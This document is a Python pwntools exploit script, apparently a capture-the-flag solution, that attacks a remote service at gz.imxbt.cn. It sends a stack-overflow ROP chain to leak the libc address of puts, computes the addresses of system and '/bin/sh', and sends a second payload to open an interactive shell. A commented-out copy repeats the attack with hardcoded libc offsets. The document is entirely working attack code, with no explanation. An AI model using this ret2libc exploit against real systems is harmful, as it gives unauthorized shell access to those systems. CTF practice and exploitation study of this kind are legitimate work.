from pwn import *



io = remote("gz.imxbt.cn",20728)
# io=process("./pwn")
elf = ELF('./pwn')
libc= ELF('./libc.so.6')

io.sendline(b'1716268440')

ret_add =0x000000000040101a
pop_rdi =0x00000000004011df
main_add =0x0000000000401221
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0xD0

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendline(payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

# libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64

# libc_base = puts_addr - libc.dump('puts')
# system_add = libc_base + libc.dump('system')
# bin_sh_add = libc_base + libc.dump('str_bin_sh')

libc_base = puts_addr - libc.symbols['puts']
system_add = libc_base + libc.symbols['system']
bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendline(payload2)

io.interactive()


# from pwn import *
# from LibcSearcher import *
# io = remote("gz.imxbt.cn",20728)
# io.sendline(b'1716268440')
#
#
#
#
# elf = ELF('./pwn')
# # libc= ELF('./libc.so.6')
#
# ret_add =0x000000000040101a
# pop_rdi =0x00000000004011df
# main_add =0x0000000000401221
# puts_got = elf.got['puts']
# puts_plt = elf.plt['puts']
#
# print("Puts_got: ",hex(puts_got))
# print("Puts_plt: ",hex(puts_plt))
#
# offset=0xD0
#
# payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
# io.sendline(payload1)
# puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
# print("Puts_addr: ",hex(puts_addr))
#
# #libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64
#
# libc_base = puts_addr - 0x080e50
# system_add = libc_base + 0x050d70
# bin_sh_add = libc_base + 0x1d8678
#
#
#
# payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)
#
# io.sendline(payload2)
#
# io.interactive()